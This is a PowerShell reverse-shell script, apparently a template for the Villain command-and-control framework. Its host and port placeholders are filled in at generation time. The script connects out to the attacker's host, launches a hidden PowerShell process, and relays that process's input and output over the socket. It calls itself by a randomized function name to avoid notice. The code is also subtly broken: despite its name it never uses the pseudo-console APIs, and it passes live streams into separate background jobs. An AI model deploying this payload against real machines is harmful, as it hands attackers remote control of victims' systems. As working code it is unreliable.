# Invoke-ConPtyShell.ps1
# Author: Antonio Cocomazzi (@antonioCoco)
# Source: https://github.com/antonioCoco/ConPtyShell
#
# Templated for Villain: *LHOST*, *LPORT*, *FUNC* are replaced at generation time.

function Invoke-ConPtyShell {
    Param (
        [Parameter(Position=0, Mandatory=$false)]
        [String]$RemoteIp = '*LHOST*',
        [Parameter(Position=1, Mandatory=$false)]
        [String]$RemotePort = '*LPORT*',
        [Parameter(Position=2, Mandatory=$false)]
        [Int]$Rows = 24,
        [Parameter(Position=3, Mandatory=$false)]
        [Int]$Cols = 100
    )

    function New-ConPtyShell {
        param($Rows, $Cols)
        Add-Type -Name ConsoleUtils -Namespace ConPtyShell -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetStdHandle(int nStdHandle);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool SetConsoleScreenBufferSize(IntPtr hConsoleOutput, COORD size);
[StructLayout(LayoutKind.Sequential)]
public struct COORD { public short X; public short Y; }
'@
        $STD_INPUT_HANDLE  = -10
        $STD_OUTPUT_HANDLE = -11
        $ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        $ENABLE_VIRTUAL_TERMINAL_INPUT = 0x0200
        $hIn  = [ConPtyShell.ConsoleUtils]::GetStdHandle($STD_INPUT_HANDLE)
        $hOut = [ConPtyShell.ConsoleUtils]::GetStdHandle($STD_OUTPUT_HANDLE)
        $mode = 0
        [ConPtyShell.ConsoleUtils]::GetConsoleMode($hOut, [ref]$mode) | Out-Null
        [ConPtyShell.ConsoleUtils]::SetConsoleMode($hOut, ($mode -bor $ENABLE_VIRTUAL_TERMINAL_PROCESSING)) | Out-Null
        [ConPtyShell.ConsoleUtils]::GetConsoleMode($hIn, [ref]$mode) | Out-Null
        [ConPtyShell.ConsoleUtils]::SetConsoleMode($hIn, ($mode -bor $ENABLE_VIRTUAL_TERMINAL_INPUT)) | Out-Null
        $size = New-Object ConPtyShell.ConsoleUtils+COORD
        $size.X = $Cols
        $size.Y = $Rows
        [ConPtyShell.ConsoleUtils]::SetConsoleScreenBufferSize($hOut, $size) | Out-Null

        $ps = New-Object System.Diagnostics.ProcessStartInfo
        $ps.FileName = 'cmd.exe'
        $ps.Arguments = '/c powershell.exe -NoLogo'
        $ps.UseShellExecute = $false
        $ps.RedirectStandardInput  = $true
        $ps.RedirectStandardOutput = $true
        $ps.RedirectStandardError  = $true
        $ps.CreateNoWindow = $true
        $proc = [System.Diagnostics.Process]::Start($ps)
        $proc
    }

    try {
        $client = New-Object System.Net.Sockets.TcpClient($RemoteIp, $RemotePort)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $proc = New-ConPtyShell -Rows $Rows -Cols $Cols
        $stdin  = $proc.StandardInput
        $stdout = $proc.StandardOutput
        $stderr = $proc.StandardError

        # Bidirectional relay
        $outBlock = {
            param($reader, $stdin)
            try {
                while (($line = $reader.ReadLine()) -ne $null) {
                    $stdin.WriteLine($line)
                }
            } catch {}
        }
        $inBlock = {
            param($writer, $stdout, $stderr)
            try {
                while ($true) {
                    if ($stdout.Peek() -ge 0) {
                        $writer.Write([char]$stdout.Read())
                    } elseif ($stderr.Peek() -ge 0) {
                        $writer.Write([char]$stderr.Read())
                    } else {
                        Start-Sleep -Milliseconds 20
                    }
                }
            } catch {}
        }
        Start-Job -ScriptBlock $outBlock -ArgumentList $reader, $stdin | Out-Null
        Start-Job -ScriptBlock $inBlock  -ArgumentList $writer, $stdout, $stderr | Out-Null

        # Block
        while (-not $proc.HasExited) { Start-Sleep -Milliseconds 200 }
    } catch {
        Write-Error $_
    } finally {
        if ($client) { $client.Close() }
    }
}

# Villain calls the function by its randomized name.
*FUNC* -RemoteIp '*LHOST*' -RemotePort '*LPORT*' -Rows 24 -Cols 100
